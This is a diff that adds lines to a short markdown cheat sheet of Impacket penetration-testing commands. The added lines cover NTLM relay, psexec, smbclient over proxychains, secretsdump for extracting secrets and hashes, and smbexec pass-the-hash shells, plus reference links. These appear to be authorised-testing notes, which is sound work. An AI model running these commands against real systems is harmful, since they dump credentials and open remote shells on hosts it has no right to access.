@@ -1,9 +1,30 @@
+## How to use
+https://www.puckiestyle.nl/impacket/
+	
+	# NTML Relay
+	https://infosecwriteups.com/abusing-ntlm-relay-and-pass-the-hash-for-admin-d24d0f12bea0
+
+	# Github
+	https://github.com/SecureAuthCorp/impacket
 
 ## Relay atack
 python smbrelay -h [host] -c [comand]
-
 
 ## Conect to windows sql
 mssqlclient.py [username/somservice]@[IP] -windows-auth 
 
 psexec.py [user]@[IP]
+
+## SMB
+proxychains smbclient.py [Domain/User]@[IP]
+
+## Extract secrets/hashes
+proxychains secretsdump.py [Domain/User]@[IP]
+	
+	## What secretsdump do
+		https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b
+
+## CMD / Powershell with hash
+smbexec.py [Domain/User]@[IP] -hashes [hash] -shell-type powershell
+
+ It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first to try authenticate against the client connecting to us.
